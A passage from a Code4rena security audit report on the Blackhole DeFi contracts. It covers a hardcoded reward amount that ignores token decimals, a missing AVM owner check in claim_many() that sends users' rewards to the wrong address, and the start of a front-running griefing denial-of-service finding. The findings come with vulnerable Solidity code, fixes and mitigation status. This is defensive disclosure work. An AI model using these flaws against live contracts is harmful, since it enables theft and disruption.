<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1"> = </span><span class="mtk7">1e10</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">rewardRate</span><span class="mtk1"> = </span><span class="mtk11">uint128</span><span class="mtk1">(</span><span class="mtk12">reward</span><span class="mtk1">/</span><span class="mtk12">remainingTimeInCurrentEpoch</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">_rewardToken</span><span class="mtk1">).</span><span class="mtk11">safeApprove</span><span class="mtk1">(</span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">customDeployer</span><span class="mtk1"> = </span><span class="mtk11">IAlgebraPoolAPIStorage</span><span class="mtk1">(</span><span class="mtk12">algebraPoolAPIStorage</span><span class="mtk1">).</span><span class="mtk11">pairToDeployer</span><span class="mtk1">(</span><span class="mtk12">_pool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAlgebraEternalFarming</span><span class="mtk1">.</span><span class="mtk12">IncentiveParams</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">incentiveParams</span><span class="mtk1"> = </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">IAlgebraEternalFarming</span><span class="mtk1">.</span><span class="mtk11">IncentiveParams</span><span class="mtk1">(</span><span class="mtk12">reward</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">rewardRate</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">tickSpacing</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IAlgebraEternalFarmingCustom</span><span class="mtk1">(</span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">).</span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">incentivekey</span><span class="mtk1">, </span><span class="mtk12">incentiveParams</span><span class="mtk1">, </span><span class="mtk12">pluginAddress</span><span class="mtk1">, </span><span class="mtk12">customDeployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This function is responsible for setting up initial incentives for Algebra concentrated liquidity farms, it uses a hardcoded reward amount of <code>1e10</code> raw units. This fixed amount is then used to determine the <code>rewardRate</code> for the initial seeding of the Algebra farm <code>(rewardRate = uint128(reward/remainingTimeInCurrentEpoch))</code>.</p>
<p>The core issue is that <code>1e10</code> raw units represent a vastly different actual value and intended incentive level depending on the <code>_rewardToken</code> number of decimals:</p>
<ul>
<li>For an 18-decimal token: <code>1e10</code> raw units is 0.00000001 of a full token. This is typically an insignificant “dust” amount.</li>
<li>For a 6-decimal token (e.g., USDC): <code>1e10</code> raw units is 10,000 full tokens (<code>$10,000 if 1 token = $1</code>).</li>
<li>For an 8-decimal token (e.g., WBTC): <code>1e10</code> raw units is 100 full tokens (<code>$10,000,000 if 1 token = $100,000</code>).</li>
</ul>
<p>This fixed raw unit amount does not adapt to the specific <code>_rewardToken</code> being used for the gauge. As a result, if <code>_rewardToken</code> is low decimal token such as <code>USDC</code>  or <code>WBTC</code> the resulting <code>rewardRate</code> will be astronomically high which cause a huge loss for the protocol.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-4"><a class="anchor before" aria-label="recommended mitigation steps 4 permalink" href="#recommended-mitigation-steps-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Modify the <code>GaugeFactoryCL.createGauge</code> function to accept an initial reward amount parameter. This allows the caller to specify an appropriate seed amount tailored to the specific <code>_rewardToken</code>, its decimals, and its value.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-29">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-04-logic-error-in-avm-original-owner-resolution"><a class="anchor before" aria-label="m 04 logic error in avm original owner resolution permalink" href="#m-04-logic-error-in-avm-original-owner-resolution"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-245">[M-04] Logic error in AVM original owner resolution</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-114">maze</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-239">maxzuvex</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/RewardsDistributor.sol#L196-L247">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/RewardsDistributor.sol#L196-L247</a></p>
<h3 style="position:relative;" id="finding-description-2"><a class="anchor before" aria-label="finding description 2 permalink" href="#finding-description-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The RewardsDistributor contract contains an inconsistency in how it handles tokens managed by the Auto Voting Escrow Manager (AVM) system. In the <code>claim()</code> function, there’s code to check if a token is managed by AVM and, if so, to retrieve the original owner for sending rewards. However, this critical check is missing in the <code>claim_many()</code> function.</p>
<p>This creates a discrepancy in reward distribution where:</p>
<ul>
<li><code>claim()</code> correctly sends rewards to the original owner of an AVM-managed token</li>
<li><code>claim_many()</code> incorrectly sends rewards to the current NFT owner (the AVM contract itself)</li>
</ul>
<p>Relevant code from <code>claim()</code>:</p>
<pre data-index="23" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_locked</span><span class="mtk1">.</span><span class="mtk12">end</span><span class="mtk1"> &lt; </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &amp;&amp; !</span><span class="mtk12">_locked</span><span class="mtk1">.</span><span class="mtk12">isPermanent</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk11">IVotingEscrow</span><span class="mtk1">(</span><span class="mtk12">voting_escrow</span><span class="mtk1">).</span><span class="mtk11">ownerOf</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">avm</span><span class="mtk1">) != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) &amp;&amp; </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">tokenIdToAVMId</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">) != </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">getOriginalOwner</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">_nftOwner</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Relevant code from <code>claim_many()</code>:</p>
<pre data-index="24" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1">(</span><span class="mtk12">_locked</span><span class="mtk1">.</span><span class="mtk12">end</span><span class="mtk1"> &lt; </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &amp;&amp; !</span><span class="mtk12">_locked</span><span class="mtk1">.</span><span class="mtk12">isPermanent</span><span class="mtk1">){</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk11">IVotingEscrow</span><span class="mtk1">(</span><span class="mtk12">_voting_escrow</span><span class="mtk1">).</span><span class="mtk11">ownerOf</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">_nftOwner</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IVotingEscrow</span><span class="mtk1">(</span><span class="mtk12">_voting_escrow</span><span class="mtk1">).</span><span class="mtk11">deposit_for</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="impact-3"><a class="anchor before" aria-label="impact 3 permalink" href="#impact-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>This inconsistency has significant impact for users who have delegated their tokens to the AVM system:</p>
<ol>
<li>Users who have expired locks and whose tokens are managed by AVM will lose their rewards if <code>claim_many()</code> is called instead of <code>claim()</code>.</li>
<li>The rewards will be sent to the AVM contract, which has no mechanism to forward these tokens to their rightful owners.</li>
<li>This results in permanent loss of rewards for affected users.</li>
<li>Since <code>claim_many()</code> is more gas efficient for claiming multiple tokens, it’s likely to be frequently used, increasing the likelihood and impact of this issue.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-5"><a class="anchor before" aria-label="recommended mitigation steps 5 permalink" href="#recommended-mitigation-steps-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ol>
<li>Add the AVM check to the <code>claim_many()</code> function to match the behavior in <code>claim()</code>:</li>
</ol>
<pre data-index="25" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1">(</span><span class="mtk12">_locked</span><span class="mtk1">.</span><span class="mtk12">end</span><span class="mtk1"> &lt; </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &amp;&amp; !</span><span class="mtk12">_locked</span><span class="mtk1">.</span><span class="mtk12">isPermanent</span><span class="mtk1">){</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk11">IVotingEscrow</span><span class="mtk1">(</span><span class="mtk12">_voting_escrow</span><span class="mtk1">).</span><span class="mtk11">ownerOf</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">avm</span><span class="mtk1">) != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) &amp;&amp; </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">tokenIdToAVMId</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">) != </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">getOriginalOwner</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">_nftOwner</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IVotingEscrow</span><span class="mtk1">(</span><span class="mtk12">_voting_escrow</span><span class="mtk1">).</span><span class="mtk11">deposit_for</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<ol start="2">
<li>For better code maintainability, consider refactoring the owner resolution logic to a separate internal function:</li>
</ol>
<pre data-index="26" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_getRewardRecipient</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_tokenId</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk11">IVotingEscrow</span><span class="mtk1">(</span><span class="mtk12">voting_escrow</span><span class="mtk1">).</span><span class="mtk11">ownerOf</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">avm</span><span class="mtk1">) != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) &amp;&amp; </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">tokenIdToAVMId</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">) != </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_nftOwner</span><span class="mtk1"> = </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">getOriginalOwner</span><span class="mtk1">(</span><span class="mtk12">_tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">_nftOwner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Then, use this function in both <code>claim()</code> and <code>claim_many()</code> to ensure consistent behavior.</p>
<h3 style="position:relative;" id="proof-of-concept-3"><a class="anchor before" aria-label="proof of concept 3 permalink" href="#proof-of-concept-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Scenario:</p>
<ol>
<li>User A delegates their tokenId #123 to the AVM system.</li>
<li>The lock for tokenId #123 expires.</li>
<li>
<p>Someone calls <code>claim(123)</code>:</p>
<ul>
<li>AVM check triggers and rewards go to User A (correct behavior)</li>
</ul>
</li>
<li>
<p>Someone calls <code>claim_many([123])</code>:</p>
<ul>
<li>No AVM check happens, rewards go to the AVM contract (incorrect behavior)</li>
</ul>
</li>
<li>User A permanently loses their rewards.</li>
</ol>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-31">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-25">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service"><a class="anchor before" aria-label="m 05 griefing attack on genesispoolmanagersoldepositnativetoken leading to denial of service permalink" href="#m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-166">[M-05] Griefing attack on <code>GenesisPoolManager.sol::depositNativeToken</code> leading to Denial of Service</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-122">FavourOkerri</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-348">AvantGard</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/GenesisPoolFactory.sol#L56-L67">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/GenesisPoolFactory.sol#L56-L67</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/PairFactory.sol#L139-L151">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/PairFactory.sol#L139-L151</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L100-L116">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L100-L116</a></p>
<h3 style="position:relative;" id="finding-description-3"><a class="anchor before" aria-label="finding description 3 permalink" href="#finding-description-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The process of depositing native token to a Genesis Pool is vulnerable to a griefing attack, leading to a denial of service (DoS) for legitimate pool creations.</p>
<p>The vulnerability arises from the interaction of the following factors:</p>
<ul>
<li>Public information: The <code>nativeToken</code> and <code>fundingToken</code> addresses intended for a new Genesis Pool become public information when the <code>GenesisPoolFactory.createGenesisPool</code> transaction enters the mempool or through the <code>GenesisCreated</code> event it emits.</li>
<li>Unrestricted pair creation: The <code>pairFactory.createPair</code> function allows any external actor to create a new liquidity pair for any given tokenA, tokenB, and stable combination, provided a pair for that combination doesn’t already exist.</li>
</ul>
<pre data-index="27" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createPair</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">stable</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1"> != </span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk8">"IA"</span><span class="mtk1">); </span><span class="mtk3">// Pair: IDENTICAL_ADDRESSES</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token0</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token1</span><span class="mtk1">) = </span><span class="mtk12">tokenA</span><span class="mtk1"> &lt; </span><span class="mtk12">tokenB</span><span class="mtk1"> ? (</span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">) : (</span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">tokenA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">token0</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">// Pair: ZERO_ADDRESS</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">getPair</span><span class="mtk1">[</span><span class="mtk12">token0</span><span class="mtk1">][</span><span class="mtk12">token1</span><span class="mtk1">][</span><span class="mtk12">stable</span><span class="mtk1">] == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"!ZA"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pair</span><span class="mtk1"> = </span><span class="mtk11">IPairGenerator</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">).</span><span class="mtk11">createPair</span><span class="mtk1">(</span><span class="mtk12">token0</span><span class="mtk1">, </span><span class="mtk12">token1</span><span class="mtk1">, </span><span class="mtk12">stable</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">getPair</span><span class="mtk1">[</span><span class="mtk12">tokenA</span><span class="mtk1">][</span><span class="mtk12">tokenB</span><span class="mtk1">][</span><span class="mtk12">stable</span><span class="mtk1">] = </span><span class="mtk12">pair</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">getPair</span><span class="mtk1">[</span><span class="mtk12">tokenB</span><span class="mtk1">][</span><span class="mtk12">tokenA</span><span class="mtk1">][</span><span class="mtk12">stable</span><span class="mtk1">] = </span><span class="mtk12">pair</span><span class="mtk1">; </span><span class="mtk3">// Store in reverse direction</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">allPairs</span><span class="mtk1">.</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">isPair</span><span class="mtk1">[</span><span class="mtk12">pair</span><span class="mtk1">] = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
